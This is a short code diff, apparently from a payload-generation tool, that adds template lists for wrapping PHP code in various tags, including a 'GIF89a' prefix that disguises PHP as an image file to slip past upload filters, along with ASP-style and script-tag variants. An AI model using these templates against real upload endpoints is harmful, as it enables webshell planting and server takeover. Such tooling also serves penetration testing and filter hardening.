@@ -213,6 +213,20 @@ SHORT_TAG_TEMPLATES = [
     "<?= {payload} ?>",
 ]
 
+UPLOAD_MODERN_WRAPPER_TEMPLATES = [
+    "<?php {payload} ?>",
+    "<?php\n{payload}\n?>",
+    "<?php/**/{payload}?>",
+    "GIF89a<?php {payload} ?>",
+    "GIF89a<?= {expr} ?>",
+]
+
+UPLOAD_LEGACY_WRAPPER_TEMPLATES = [
+    "<% {payload} %>",
+    "<%={expr}%>",
+    '<script language="php">{payload}</script>',
+]
+
 # 反引号
 BACKTICK_TEMPLATES = [
     "`{cmd}`",
